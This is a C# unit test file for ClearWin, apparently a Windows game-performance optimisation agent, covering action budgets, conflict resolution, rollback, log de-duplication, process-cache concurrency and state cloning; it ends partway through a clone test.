using System;
using System.Collections.Generic;
using System.Threading;
using ClearWin.RuleEngine;
using System.IO;

namespace ClearWin
{
    public static class UnitTests
    {
        public static bool RunAll()
        {
            bool ok = true;
            try { TestBudget(); Console.WriteLine("  PASS: Budget"); } catch (Exception ex) { Console.WriteLine("  FAIL: Budget - " + ex.Message); ok = false; }
            try { TestConfidence(); Console.WriteLine("  PASS: Confidence"); } catch (Exception ex) { Console.WriteLine("  FAIL: Confidence - " + ex.Message); ok = false; }
            try { TestCosts(); Console.WriteLine("  PASS: Costs"); } catch (Exception ex) { Console.WriteLine("  FAIL: Costs - " + ex.Message); ok = false; }
            try { TestPreconditions(); Console.WriteLine("  PASS: Preconditions"); } catch (Exception ex) { Console.WriteLine("  FAIL: Preconditions - " + ex.Message); ok = false; }
            try { TestConflicts(); Console.WriteLine("  PASS: Conflicts"); } catch (Exception ex) { Console.WriteLine("  FAIL: Conflicts - " + ex.Message); ok = false; }
            try { TestTelemetry(); Console.WriteLine("  PASS: Telemetry"); } catch (Exception ex) { Console.WriteLine("  FAIL: Telemetry - " + ex.Message); ok = false; }
            try { TestAnalyzerInterface(); Console.WriteLine("  PASS: Analyzer Interface"); } catch (Exception ex) { Console.WriteLine("  FAIL: Analyzer Interface - " + ex.Message); ok = false; }
            try { TestMockCollector(); Console.WriteLine("  PASS: Mock Collector"); } catch (Exception ex) { Console.WriteLine("  FAIL: Mock Collector - " + ex.Message); ok = false; }
            try { TestCancellation(); Console.WriteLine("  PASS: Cancellation"); } catch (Exception ex) { Console.WriteLine("  FAIL: Cancellation - " + ex.Message); ok = false; }
            try { TestRollback(); Console.WriteLine("  PASS: Rollback"); } catch (Exception ex) { Console.WriteLine("  FAIL: Rollback - " + ex.Message); ok = false; }
            try { TestDependencyGraph(); Console.WriteLine("  PASS: Dependency Graph"); } catch (Exception ex) { Console.WriteLine("  FAIL: Dependency Graph - " + ex.Message); ok = false; }
            try { TestMemoryCaps(); Console.WriteLine("  PASS: Memory Caps"); } catch (Exception ex) { Console.WriteLine("  FAIL: Memory Caps - " + ex.Message); ok = false; }
            try { TestAging(); Console.WriteLine("  PASS: Aging"); } catch (Exception ex) { Console.WriteLine("  FAIL: Aging - " + ex.Message); ok = false; }
            try { TestLockOrdering(); Console.WriteLine("  PASS: Lock Ordering"); } catch (Exception ex) { Console.WriteLine("  FAIL: Lock Ordering - " + ex.Message); ok = false; }
            try { TestSaveLoadRoundTrip(); Console.WriteLine("  PASS: Save/Load Round Trip"); } catch (Exception ex) { Console.WriteLine("  FAIL: Save/Load Round Trip - " + ex.Message); ok = false; }
            try { TestEmptyState(); Console.WriteLine("  PASS: Empty State"); } catch (Exception ex) { Console.WriteLine("  FAIL: Empty State - " + ex.Message); ok = false; }
            try { TestExtremeValues(); Console.WriteLine("  PASS: Extreme Values"); } catch (Exception ex) { Console.WriteLine("  FAIL: Extreme Values - " + ex.Message); ok = false; }
            try { TestNullSafety(); Console.WriteLine("  PASS: Null Safety"); } catch (Exception ex) { Console.WriteLine("  FAIL: Null Safety - " + ex.Message); ok = false; }
            try { TestModeTransitions(); Console.WriteLine("  PASS: Mode Transitions"); } catch (Exception ex) { Console.WriteLine("  FAIL: Mode Transitions - " + ex.Message); ok = false; }
            try { TestCooldown(); Console.WriteLine("  PASS: Cooldown"); } catch (Exception ex) { Console.WriteLine("  FAIL: Cooldown - " + ex.Message); ok = false; }
            try { TestDecisionPriority(); Console.WriteLine("  PASS: Decision Priority"); } catch (Exception ex) { Console.WriteLine("  FAIL: Decision Priority - " + ex.Message); ok = false; }
            try { TestKnapsackBudget(); Console.WriteLine("  PASS: Knapsack Budget"); } catch (Exception ex) { Console.WriteLine("  FAIL: Knapsack Budget - " + ex.Message); ok = false; }
            try { TestHealthScore(); Console.WriteLine("  PASS: Health Score"); } catch (Exception ex) { Console.WriteLine("  FAIL: Health Score - " + ex.Message); ok = false; }
            try { TestActionExecTimesCap(); Console.WriteLine("  PASS: Action Exec Times Cap"); } catch (Exception ex) { Console.WriteLine("  FAIL: Action Exec Times Cap - " + ex.Message); ok = false; }
            try { TestSystemStateClone(); Console.WriteLine("  PASS: SystemState Clone"); } catch (Exception ex) { Console.WriteLine("  FAIL: SystemState Clone - " + ex.Message); ok = false; }
            try { TestFrameTimeTrackerPrealloc(); Console.WriteLine("  PASS: FrameTime Tracker Prealloc"); } catch (Exception ex) { Console.WriteLine("  FAIL: FrameTime Tracker Prealloc - " + ex.Message); ok = false; }
            try { TestAnalyzerManagerThreadSafety(); Console.WriteLine("  PASS: AnalyzerManager Thread Safety"); } catch (Exception ex) { Console.WriteLine("  FAIL: AnalyzerManager Thread Safety - " + ex.Message); ok = false; }
            try { TestAdaptiveThresholds(); Console.WriteLine("  PASS: Adaptive Thresholds"); } catch (Exception ex) { Console.WriteLine("  FAIL: Adaptive Thresholds - " + ex.Message); ok = false; }
            try { TestOutcomeVerifiedLearning(); Console.WriteLine("  PASS: Outcome-Verified Learning"); } catch (Exception ex) { Console.WriteLine("  FAIL: Outcome-Verified Learning - " + ex.Message); ok = false; }
            try { TestSmartAgentGaming60FpsFloorPublic(); Console.WriteLine("  PASS: Gaming 60 FPS Floor"); } catch (Exception ex) { Console.WriteLine("  FAIL: Gaming 60 FPS Floor - " + ex.Message); ok = false; }
            return ok;
        }

        // ------------------------------------------------------------------
        // Log resilience (regression guards for the 6158-line log storm)
        // ------------------------------------------------------------------

        /// <summary>
        /// CWLog used to write one line per failed OS call with no de-duplication,
        /// so a single denied privileged call produced thousands of identical
        /// lines. The logger now folds repeats into periodic summaries; this test
        /// asserts the accounting is exact and that distinct messages stay
        /// independent (no cross-contamination of the de-dup keys).
        /// </summary>
        internal static void TestCWLogDuplicateSuppressionPublic()
        {
            CWLog.ResetDuplicateTracking();

            const int hits = 500;
            const int expectedWritten = 4; // original + summaries at repeats 25, 225, 425 (25 + 200*k)
            int before = CWLog.DiagnosticWriteCalls;
            int evictBefore = CWLog.DiagnosticEvictions;
            int resetBefore = CWLog.DiagnosticResets;
            for (int i = 0; i < hits; i++)
                CWLog.Error("CWTest", new InvalidOperationException("Access is denied"));
            int actualCalls = CWLog.DiagnosticWriteCalls - before;
            int evictions = CWLog.DiagnosticEvictions - evictBefore;
            int resets = CWLog.DiagnosticResets - resetBefore;
            if (actualCalls != hits)
                throw new Exception("Logger was entered " + actualCalls + " times for " + hits + " calls; evictions=" + evictions + ".");

            const string msg = "InvalidOperationException: Access is denied";

            // Every request must be accounted for exactly once.
            int seen = CWLog.OccurrenceCount("ERROR", "CWTest", msg);
            int written = CWLog.WrittenCount("ERROR", "CWTest", msg);
            int suppressed = CWLog.SuppressedCount("ERROR", "CWTest", msg);
            if (seen != hits)
                throw new Exception("Expected " + hits + " occurrences, got " + seen + "; evictions=" + evictions + "; resetsDuringTest=" + resets + "; swallowed=" + CWLog.DiagnosticLastSwallowed + "; keys=" + CWLog.DiagnosticDumpKeys());
            if (written + suppressed != seen)
                throw new Exception("Accounting mismatch: " + written + " written + " + suppressed + " suppressed != " + seen + " seen.");
            if (written != expectedWritten)
                throw new Exception("Expected " + expectedWritten + " lines for " + hits + " repeats, got " + written + ".");
            if (suppressed != hits - expectedWritten)
                throw new Exception("Expected " + (hits - expectedWritten) + " folded, got " + suppressed + ".");

            // A different message under the same subsystem must not be folded
            // into the first one (key must include the message).
            CWLog.Error("CWTest", new InvalidOperationException("different failure"));
            int otherWritten = CWLog.WrittenCount("ERROR", "CWTest", "InvalidOperationException: different failure");
            if (otherWritten != 1)
                throw new Exception("Distinct messages must be tracked independently, got " + otherWritten + " written.");

            // The same message under a different subsystem must also be independent.
            CWLog.Error("CWOther", new InvalidOperationException("Access is denied"));
            int otherSub = CWLog.WrittenCount("ERROR", "CWOther", msg);
            if (otherSub != 1)
                throw new Exception("Distinct subsystems must be tracked independently, got " + otherSub + " written.");

            // A null exception must not throw (logger contract).
            CWLog.Error("CWNull", null);
            if (CWLog.WrittenCount("ERROR", "CWNull", "(null exception)") != 1)
                throw new Exception("Null-exception path should log exactly once.");

            CWLog.ResetDuplicateTracking();
        }

        /// <summary>
        /// Process enumeration is the hottest shared-resource path in the agent:
        /// several callers walk the same cached snapshot while the refresh thread
        /// swaps it. Repeated refreshes must neither throw nor leave the cache
        /// empty, and the snapshot handed to callers must be usable.
        /// </summary>
        /// <summary>
        /// The de-dup table is capped (MAX_TRACKED_DUPES). Overflow must not wipe
        /// the counters of messages that are actively repeating, because losing
        /// Occurrences mid-storm silently corrupts the written+suppressed
        /// accounting and re-enables a log flood. This test deliberately
        /// overflows the table and then asserts a live key keeps counting.
        /// </summary>
        internal static void TestCWLogEvictionPublic()
        {
            CWLog.ResetDuplicateTracking();

            // The live, always-repeating key we will check after the flood.
            const string liveMsg = "live-key-stays-tracked"; // exception message; CWLog.Error prefixes the type
            const string liveKey = "InvalidOperationException: " + liveMsg; // the de-dup key actually stored

            int evictBefore = CWLog.DiagnosticEvictions;
            for (int i = 0; i < 700; i++)
            {
                CWLog.Error("EvictTest", new InvalidOperationException(liveMsg));
                // Noise: every one of these is a distinct one-shot key, so they
                // are the eviction candidates. 700 noise + 1 live key exceeds
                // MAX_TRACKED_DUPES (512), so the table genuinely overflows.
                CWLog.Error("EvictTest", new InvalidOperationException("noise-" + i)); // distinct one-shot keys
            }
            int evictions = CWLog.DiagnosticEvictions - evictBefore;

            int seen = CWLog.OccurrenceCount("ERROR", "EvictTest", liveKey);
            int written = CWLog.WrittenCount("ERROR", "EvictTest", liveKey);
            int suppressed = CWLog.SuppressedCount("ERROR", "EvictTest", liveKey);
            if (written + suppressed != seen)
                throw new Exception("Live key lost its accounting during eviction: " + written + " + " + suppressed + " != " + seen + ".");
            if (evictions <= 0)
                throw new Exception("Table overflow never evicted anything (keys stayed under the cap?).");
            if (suppressed < 600)
                throw new Exception("Live key should still be folded after overflow, suppressed only " + suppressed + ".");

            CWLog.ResetDuplicateTracking();
        }
        internal static void TestProcessCacheConcurrencyPublic()
        {
            var agent = new SmartAgent();
            bool anyNonEmpty = false;
            for (int i = 0; i < 5; i++)
            {
                var procs = agent.GetProcessesForTest();
                if (procs != null && procs.Length > 0) anyNonEmpty = true;
            }
            if (!anyNonEmpty)
                throw new Exception("Process cache never produced a snapshot; Windows should always expose processes.");

            // Concurrent enumeration must not surface unhandled exceptions.
            System.Threading.Tasks.Parallel.For(0, 8, new System.Threading.Tasks.ParallelOptions { MaxDegreeOfParallelism = 8 }, delegate (int i)
            {
                for (int k = 0; k < 25; k++)
                {
                    var procs = agent.GetProcessesForTest();
                    if (procs == null) return;
                    for (int j = 0; j < procs.Length; j++)
                    {
                        try
                        {
                            // Deliberately touch a guarded property: an exited
                            // process throws Win32Exception, which must stay
                            // contained rather than tear down the sweep.
                            var _unused = procs[j].WorkingSet64;
                        }
                        catch (Exception) { /* expected for dead processes */ }
                    }
                }
            });
        }
        public static void TestBudgetPublic() { TestBudget(); }
        public static void TestConfidencePublic() { TestConfidence(); }
        public static void TestCostsPublic() { TestCosts(); }
        public static void TestPreconditionsPublic() { TestPreconditions(); }
        public static void TestConflictsPublic() { TestConflicts(); }
        public static void TestTelemetryPublic() { TestTelemetry(); }
        public static void TestAnalyzerInterfacePublic() { TestAnalyzerInterface(); }
        public static void TestMockCollectorPublic() { TestMockCollector(); }
        public static void TestCancellationPublic() { TestCancellation(); }
        public static void TestRollbackPublic() { TestRollback(); }
        public static void TestDependencyGraphPublic() { TestDependencyGraph(); }
        public static void TestMemoryCapsPublic() { TestMemoryCaps(); }
        public static void TestAgingPublic() { TestAging(); }
        public static void TestLockOrderingPublic() { TestLockOrdering(); }
        public static void TestSaveLoadRoundTripPublic() { TestSaveLoadRoundTrip(); }
        public static void TestEmptyStatePublic() { TestEmptyState(); }
        public static void TestExtremeValuesPublic() { TestExtremeValues(); }
        public static void TestNullSafetyPublic() { TestNullSafety(); }
        public static void TestModeTransitionsPublic() { TestModeTransitions(); }
        public static void TestCooldownPublic() { TestCooldown(); }
        public static void TestDecisionPriorityPublic() { TestDecisionPriority(); }
        public static void TestKnapsackBudgetPublic() { TestKnapsackBudget(); }
        public static void TestHealthScorePublic() { TestHealthScore(); }
        public static void TestActionExecTimesCapPublic() { TestActionExecTimesCap(); }
        public static void TestSystemStateClonePublic() { TestSystemStateClone(); }
        public static void TestFrameTimeTrackerPreallocPublic() { TestFrameTimeTrackerPrealloc(); }
        public static void TestOutcomeVerifiedLearningPublic() { TestOutcomeVerifiedLearning(); }
        public static void TestAnalyzerManagerThreadSafetyPublic() { TestAnalyzerManagerThreadSafety(); }
        public static void TestAdaptiveThresholdsPublic() { TestAdaptiveThresholds(); }
        public static void TestFpsStabilizerCorePublic() { TestFpsStabilizerCore(); }
        public static void TestFpsStabilizerDropDetectionPublic() { TestFpsStabilizerDropDetection(); }
        public static void TestFpsStabilizerPredictionPublic() { TestFpsStabilizerPrediction(); }
        public static void TestFpsStabilizerPreventionPublic() { TestFpsStabilizerPrevention(); }
        public static void TestFpsStabilizerDropNotPreventedPublic() { TestFpsStabilizerDropNotPrevented(); }
        public static void TestFpsStabilizerPredictorsPublic() { TestFpsStabilizerPredictors(); }
        public static void TestFpsStabilizerCooldownPublic() { TestFpsStabilizerCooldown(); }
        public static void TestSmartAgentFpsStabilizerPublic() { TestSmartAgentFpsStabilizer(); }
        public static void TestFpsStabilizerFloorModePublic() { TestFpsStabilizerFloorMode(); }
        public static void TestSmartAgentFloorModesPublic() { TestSmartAgentFloorModes(); }
        public static void TestFpsStabilizerDecisionDemoPublic() { TestFpsStabilizerDecisionDemo(); }
        public static void TestSmartAgentInitPublic() { TestSmartAgentInit(); }
        public static void TestSmartAgentHighCPUPublic() { TestSmartAgentHighCPU(); }
        public static void TestSmartAgentHighRAMPublic() { TestSmartAgentHighRAM(); }
        public static void TestSmartAgentThermalThrottlePublic() { TestSmartAgentThermalThrottle(); }
        public static void TestSmartAgentGamingPublic() { TestSmartAgentGaming(); }
        public static void TestSmartAgentRLPublic() { TestSmartAgentRL(); }
        public static void TestSmartAgentCausalAIPublic() { TestSmartAgentCausalAI(); }
        public static void TestSmartAgentMultiAgentPublic() { TestSmartAgentMultiAgent(); }
        public static void TestSmartAgentWorldModelPublic() { TestSmartAgentWorldModel(); }
        public static void TestSmartAgentRiskEnginePublic() { TestSmartAgentRiskEngine(); }
        public static void TestToolTrainingPublic() { TestToolTraining(); }
        public static void TestToolExecutionPublic() { TestToolExecution(); }
        public static void TestSmartAgentHealthScorePublic() { TestSmartAgentHealthScore(); }
        public static void TestSmartAgentDecisionPipelinePublic() { TestSmartAgentDecisionPipeline(); }
        public static void TestKillSwitchPublic() { TestKillSwitch(); }
        public static void TestPauseResumePublic() { TestPauseResume(); }
        public static void TestExtremeThermalCascadePublic() { TestExtremeThermalCascade(); }
        public static void TestBudgetExhaustionPublic() { TestBudgetExhaustion(); }
        public static void TestSafeModeTriggerPublic() { TestSafeModeTrigger(); }
        public static void TestModeStormPublic() { TestModeStorm(); }
        public static void TestNullStateFieldsPublic() { TestNullStateFields(); }
        public static void TestAllPreconditionsFailPublic() { TestAllPreconditionsFail(); }
        public static void TestToolEdgeCasesPublic() { TestToolEdgeCases(); }
        public static void TestWorldModelStressPublic() { TestWorldModelStress(); }
        public static void TestRLExplorationFloorPublic() { TestRLExplorationFloor(); }
        public static void TestConflictCascadePublic() { TestConflictCascade(); }
        public static void TestGameExitMidOptPublic() { TestGameExitMidOpt(); }
        public static void TestConcurrentTickStressPublic() { TestConcurrentTickStress(); }
        public static void TestEmergencyStopAllPublic() { TestEmergencyStopAll(); }
        public static void TestRapidHealthSwingPublic() { TestRapidHealthSwing(); }
        public static void TestZeroResourceStatePublic() { TestZeroResourceState(); }
        public static void TestRingBufferPublic() { TestRingBuffer(); }
        public static void TestMessageBusPublic() { TestMessageBus(); }
        public static void TestAgentInterfacesPublic() { TestAgentInterfaces(); }

        public static void TestRuleEngineInitPublic() { TestRuleEngineInit(); }
        public static void TestRuleKnowledgeBasePublic() { TestRuleKnowledgeBase(); }
        public static void TestReasoningEnginePublic() { TestReasoningEngine(); }
        public static void TestPlannerPublic() { TestPlanner(); }
        public static void TestDecisionEnginePublic() { TestDecisionEngine(); }
        public static void TestActionValidatorPublic() { TestActionValidator(); }
        public static void TestSafetyEnginePublic() { TestSafetyEngine(); }
        public static void TestLearningEnginePublic() { TestLearningEngine(); }
        public static void TestMemoryEnginePublic() { TestMemoryEngine(); }
        public static void TestDiagnosticEnginePublic() { TestDiagnosticEngine(); }
        public static void TestExplainEnginePublic() { TestExplainEngine(); }
        public static void TestRuleEnginePipelinePublic() { TestRuleEnginePipeline(); }
        public static void TestRuleEnginePersistencePublic() { TestRuleEnginePersistence(); }
        public static void TestSmartAgentExpertIntegrationPublic() { TestSmartAgentExpertIntegration(); }

        static void Assert(bool condition, string msg)
        {
            if (!condition) throw new Exception(msg);
        }

        static void TestBudget()
        {
            var costs = new Dictionary<string, int>
            {
                {"AggressiveClean", 5}, {"LightClean", 3}, {"PurgeStandbyList", 5},
                {"BoostGamePriority", 4}, {"EmergencyThrottle", 6}
            };
            foreach (var kv in costs) Assert(kv.Value > 0 && kv.Value <= 10, "Cost out of range: " + kv.Key);
            // Budget exhaustion: picking expensive actions should exceed budget
            int budget = 10;
            int used = costs["AggressiveClean"] + costs["EmergencyThrottle"];
            Assert(used > budget, "Two expensive actions should exceed budget");
        }

        static void TestConfidence()
        {
            double c = 0.99;
            Assert(c >= 0 && c <= 1.0, "Confidence out of range");
            c = 0.01;
            Assert(c >= 0 && c <= 1.0, "Confidence min");
            c = 0.5;
            Assert(c >= 0 && c <= 1.0, "Confidence mid");
        }

        static void TestCosts()
        {
            Assert(10 + 0 < 12, "Budget carry-over");
            Assert(10 + 5 >= 12, "Budget with max carry-over");
        }

        static void TestPreconditions()
        {
            var snapshot = new SystemSnapshot { ActiveProcess = "", ProcessCount = 50 };
            bool gameOk = !string.IsNullOrEmpty(snapshot.ActiveProcess);
            Assert(!gameOk, "Game precondition should fail with no game");
            snapshot.ActiveProcess = "game.exe";
            gameOk = !string.IsNullOrEmpty(snapshot.ActiveProcess);
            Assert(gameOk, "Game precondition should pass with game");
        }

        static void TestConflicts()
        {
            var conflicts = new Dictionary<string, string[]>
            {
                {"BatterySaver", new[] {"UnparkAllCores"}},
                {"EmergencyThrottle", new[] {"UnparkAllCores"}}
            };
            Assert(conflicts.ContainsKey("BatterySaver"), "Missing BatterySaver conflict");
            Assert(conflicts.ContainsKey("EmergencyThrottle"), "Missing EmergencyThrottle conflict");
            // Verify both conflict with the same action
            string[] bsConflicts;
            Assert(conflicts.TryGetValue("BatterySaver", out bsConflicts), "BatterySaver should have conflicts");
            bool foundUnpark = false;
            foreach (string c in bsConflicts) if (c == "UnparkAllCores") foundUnpark = true;
            Assert(foundUnpark, "BatterySaver should conflict with UnparkAllCores");
        }

        static void TestTelemetry()
        {
            var times = new Dictionary<string, List<double>>();
            var list = new List<double> { 15, 20, 25 };
            times["TestAction"] = list;
            double avg = 0;
            foreach (double t in times["TestAction"]) avg += t;
            avg /= times["TestAction"].Count;
            Assert(Math.Abs(avg - 20.0) < 0.01, "Average should be 20");
            Assert(times["TestAction"].Count == 3, "Should have 3 samples");
        }

        static void TestAnalyzerInterface()
        {
            var mock = new MockAnalyzer();
            Assert(mock.Name == "Mock", "Name should be Mock");
            var snap = new SystemSnapshot { CpuUsage = 95 };
            Assert(mock.CanRun(snap), "Should run when CPU > 90");
            var result = mock.Analyze(snap);
            Assert(result != null, "Result should not be null");
            Assert(result.Priority == 5, "Priority should be 5 for high CPU");
            snap.CpuUsage = 50;
            Assert(!mock.CanRun(snap), "Should not run when CPU <= 90");
        }

        static void TestMockCollector()
        {
            var snap = new SystemSnapshot
            {
                CpuUsage = 45.5, RamUsage = 60.0, GpuUsage = 30.0,
                CpuTemp = 65.0, GpuTemp = 55.0, Fps = 60.0,
                ProcessCount = 120, ActiveProcess = "notepad.exe", IsCharging = true
            };
            Assert(snap.CpuUsage > 0, "CPU should be positive");
            Assert(snap.RamUsage >= 0 && snap.RamUsage <= 100, "RAM in valid range");
            Assert(snap.Fps >= 0, "FPS should not be negative");
            Assert(snap.ProcessCount > 0, "Process count > 0");
        }

        static void TestCancellation()
        {
            var cts = new CancellationTokenSource();
            Assert(!cts.IsCancellationRequested, "Should not be cancelled initially");
            cts.Cancel();
            Assert(cts.IsCancellationRequested, "Should be cancelled after Cancel()");
            Assert(cts.Token.IsCancellationRequested, "Token should reflect cancellation");
        }

        static void TestRollback()
        {
            // Test single rollback: execute action, detect failure, restore original
            string currentPlan = "Power Saver";
            string originalPlan = currentPlan;
            bool actionSuccess = false;
            // Simulate: try to change plan
            string newPlan = "High Performance";
            currentPlan = newPlan;
            // Action failed - rollback
            if (!actionSuccess) currentPlan = originalPlan;
            Assert(currentPlan == originalPlan, "Single rollback should restore original plan");
            Assert(currentPlan != newPlan, "Rolled back plan should not be the new plan");

            // Test multi-action rollback: all-or-nothing semantics
            string plan1 = "Balanced";
            string plan2 = "Power Saver";
            string savedPlan1 = plan1;
            string savedPlan2 = plan2;
            bool action1Ok = true;
            bool action2Ok = false;
            // Apply both changes
            plan1 = "High Performance";
            plan2 = "Ultimate Performance";
            // Check results: if either fails, rollback both
            if (!action1Ok || !action2Ok) { plan1 = savedPlan1; plan2 = savedPlan2; }
            Assert(plan1 == savedPlan1, "Multi-rollback plan1 restored");
            Assert(plan2 == savedPlan2, "Multi-rollback plan2 restored");

            // Test successful action: no rollback
            string plan3 = "Balanced";
            string savedPlan3 = plan3;
            bool action3Ok = true;
            plan3 = "High Performance";
            if (!action3Ok) plan3 = savedPlan3;
            Assert(plan3 == "High Performance", "Successful action should not be rolled back");
        }

        static void TestDependencyGraph()
        {
            var candidates = new List<string> { "BatterySaver", "UnparkAllCores", "BalancedPerformance" };
            var conflicts = new Dictionary<string, string[]>
            {
                {"BatterySaver", new[] {"UnparkAllCores"}},
                {"EmergencyThrottle", new[] {"UnparkAllCores"}},
                {"SetGameAffinity", new[] {"LimitBackgroundAffinity"}},
                {"BoostGamePriority", new[] {"EmergencyThrottle"}}
            };
            string[] batteryConflicts;
            Assert(conflicts.TryGetValue("BatterySaver", out batteryConflicts), "BatterySaver should have conflicts");
            bool found = false;
            foreach (string c in batteryConflicts) if (c == "UnparkAllCores") found = true;
            Assert(found, "BatterySaver should conflict with UnparkAllCores");
            var resolved = new List<string>();
            var removed = new System.Collections.Generic.HashSet<string>();
            for (int i = 0; i < candidates.Count; i++)
            {
                if (removed.Contains(candidates[i])) continue;
                string[] confs;
                if (conflicts.TryGetValue(candidates[i], out confs))
                {
                    foreach (string conf in confs)
                    {
                        if (candidates.Contains(conf) && !removed.Contains(conf))
                            removed.Add(conf);
                    }
                }
                if (!removed.Contains(candidates[i])) resolved.Add(candidates[i]);
            }
            Assert(resolved.Contains("BatterySaver") || resolved.Contains("UnparkAllCores"), "Only one should survive");
            Assert(!(resolved.Contains("BatterySaver") && resolved.Contains("UnparkAllCores")), "Both should not coexist");
        }

        static void TestMemoryCaps()
        {
            var list = new List<int>();
            int cap = 100;
            for (int i = 0; i < 150; i++) { list.Add(i); if (list.Count > cap) list.RemoveAt(0); }
            Assert(list.Count <= cap, "List should not exceed cap of " + cap);
            Assert(list.Count == cap, "List should be exactly " + cap + " after overflow");
            Assert(list[0] == 50, "First element should be 50 (oldest removed)");
        }

        static void TestAging()
        {
            int age = 10;
            double expectedCap = 15;
            age = (int)(age * 1.05);
            age = (int)Math.Min(age, expectedCap);
            Assert(age == 10, "10 * 1.05 = 10 (int truncation)");
            age = (int)(age * 0.7);
            Assert(age == 7, "10 * 0.7 = 7 (reset)");
        }

        static void TestLockOrdering()
        {
            // Test that consistent lock ordering prevents deadlock
            // Simulate: lock A then B (correct order)
            object lockA = new object();
            object lockB = new object();
            bool deadlockDetected = false;
            int orderA = 0, orderB = 0;

            Thread t1 = new Thread(() =>
            {
                lock (lockA) { orderA = 1; Thread.Sleep(10); lock (lockB) { orderA = 2; } }
            });
            Thread t2 = new Thread(() =>
            {
                Thread.Sleep(5);
                lock (lockA) { orderB = 1; lock (lockB) { orderB = 2; } }
            });

            t1.Start(); t2.Start();
            bool finished = t1.Join(2000) && t2.Join(2000);
            Assert(finished, "Threads should complete (no deadlock)");
            Assert(orderA == 2 && orderB == 2, "Both threads should complete fully");
        }

        static void TestSaveLoadRoundTrip()
        {
            var lines = new List<string>();
            var exp = new AgentExperience { Action = "TestAction", Score = 75.5, TimesUsed = 3, TimesSuccessful = 2 };
            exp.LastUsed = new DateTime(2026, 1, 1);
            string line = string.Format("{0}|{1}|{2}|{3}|{4}|{5}|{6}|{7}|{8}|{9}|{10}|{11}|{12}|{13}|{14}",
                exp.Id, exp.GameName ?? "", (int)exp.Category, exp.Action, exp.StateBefore ?? "", exp.StateAfter ?? "",
                exp.FpsBefore, exp.FpsAfter, exp.StabilityBefore, exp.StabilityAfter, (int)exp.Result,
                exp.Score, exp.TimesUsed, exp.TimesSuccessful, exp.LastUsed.Ticks);
            lines.Add(line);
            string[] parts = lines[0].Split('|');
            Assert(parts.Length >= 15, "Should have 15 parts");
            Assert(parts[3] == "TestAction", "Action should match");
            Assert(double.Parse(parts[11]) == 75.5, "Score should match");
        }

        static void TestEmptyState()
        {
            var emptyList = new List<int>();
            Assert(emptyList.Count == 0, "Empty list count is 0");
            Assert(emptyList != null, "Empty list not null");
            string s = null;
            Assert(string.IsNullOrEmpty(s), "Null string is empty");
            s = "";
            Assert(string.IsNullOrEmpty(s), "Empty string is empty");
        }

        static void TestExtremeValues()
        {
            double maxCpu = 100.0;
            double minCpu = 0.0;
            double negativeCpu = -5.0;
            double highTemp = 110.0;
            Assert(maxCpu >= 0 && maxCpu <= 100, "CPU max valid");
            Assert(minCpu >= 0 && minCpu <= 100, "CPU min valid");
            Assert(negativeCpu < 0, "Negative CPU invalid");
            Assert(highTemp > 100, "High temp beyond normal");
        }

        static void TestNullSafety()
        {
            SystemSnapshot snap = null;
            bool isNull = snap == null;
            Assert(isNull, "Null snapshot");
            snap = new SystemSnapshot();
            Assert(snap != null, "NonNull snapshot");
            Assert(snap.ActiveProcess == null, "Default string null");
        }

        static void TestModeTransitions()
        {
            int mode = 0; // Off
            Assert(mode == 0, "Mode Off");
            mode = 1; // AutoPilot
            Assert(mode == 1, "Mode AutoPilot");
            mode = 2; // GameMode
            Assert(mode == 2, "Mode GameMode");
            mode = 3; // Assisted
            Assert(mode == 3, "Mode Assisted");
            mode = 0; // Back to Off
            Assert(mode == 0, "Mode reset to Off");
        }

        static void TestCooldown()
        {
            var cooldowns = new Dictionary<string, DateTime>();
            string action = "BoostGamePriority";
            Assert(!cooldowns.ContainsKey(action), "No cooldown initially");
            cooldowns[action] = DateTime.Now;
            Assert(cooldowns.ContainsKey(action), "Cooldown set");
            TimeSpan elapsed = DateTime.Now - cooldowns[action];
            Assert(elapsed.TotalSeconds < 1, "Just set, elapsed < 1s");
        }

        static void TestDecisionPriority()
        {
            double confidence = 0.85;
            double severity = 0.75;
            double reliability = 0.9;
            double priority = confidence * 0.35 + severity * 0.35 + reliability * 0.30;
            Assert(priority > 0.8, "Priority weighted sum > 0.8");
            Assert(priority <= 1.0, "Priority weighted sum <= 1.0");
            // Emergency override
            double temp = 95.0;
            if (temp > 90) priority = 100;
            Assert(priority == 100, "Emergency override sets priority to 100");
        }

        static void TestKnapsackBudget()
        {
            int budget = 10;
            int used = 0;
            var actions = new Dictionary<string, int> { {"Clean", 3}, {"Boost", 4}, {"Throttle", 6}, {"Saver", 2} };
            var selected = new List<string>();
            foreach (var kv in actions)
            {
                if (used + kv.Value <= budget) { selected.Add(kv.Key); used += kv.Value; }
            }
            Assert(used <= budget, "Total cost within budget");
            Assert(selected.Count > 0, "At least one action selected");
        }

        static void TestHealthScore()
        {
            double cpu = 50.0, ram = 60.0, disk = 30.0;
            double score = 100 - Math.Max(0, (cpu - 20) * 0.3) - Math.Max(0, (ram - 40) * 0.3) - Math.Max(0, (disk - 70) * 0.2);
            if (score < 0) score = 0; if (score > 100) score = 100;
            Assert(score > 0 && score <= 100, "Health score valid range");
            Assert(score < 100, "Health score penalized");
        }

        static void TestActionExecTimesCap()
        {
            var times = new List<double>();
            int maxSamples = 20;
            for (int i = 0; i < 30; i++) { times.Add(i); if (times.Count > maxSamples) times.RemoveAt(0); }
            Assert(times.Count == maxSamples, "Telemetry capped at " + maxSamples);
            Assert(times[0] == 10, "Oldest sample removed, first is 10");
        }

        // === NEW TESTS ===

        static void TestSystemStateClone()
        {
            var original = new SystemState
            {
                CpuUsage = 75.5, RamUsage = 60.2, GpuUsage = 45.0,
                CpuTemp = 72.0, Fps = 120.0, ProcessCount = 150,
                ActiveProcess = "game.exe", IsGame = true, IsCharging = false,
                BatteryLevel = 85.0, PowerPlan = "High Performance",
                CpuCoreCount = 8, TotalRamGB = 16, UsedRamGB = 8.5,
                FpsStability = 92.0, FrameTimeJitter = 1.5
            };
            var clone = original.Clone();
            // Verify all fields copied
            Assert(clone.CpuUsage == original.CpuUsage, "CpuUsage copied");
            Assert(clone.RamUsage == original.RamUsage, "RamUsage copied");
            Assert(clone.GpuUsage == original.GpuUsage, "GpuUsage copied");
            Assert(clone.CpuTemp == original.CpuTemp, "CpuTemp copied");
            Assert(clone.Fps == original.Fps, "Fps copied");
            Assert(clone.ProcessCount == original.ProcessCount, "ProcessCount copied");
            Assert(clone.ActiveProcess == original.ActiveProcess, "ActiveProcess copied");
            Assert(clone.IsGame == original.IsGame, "IsGame copied");
            Assert(clone.IsCharging == original.IsCharging, "IsCharging copied");
            Assert(clone.BatteryLevel == original.BatteryLevel, "BatteryLevel copied");
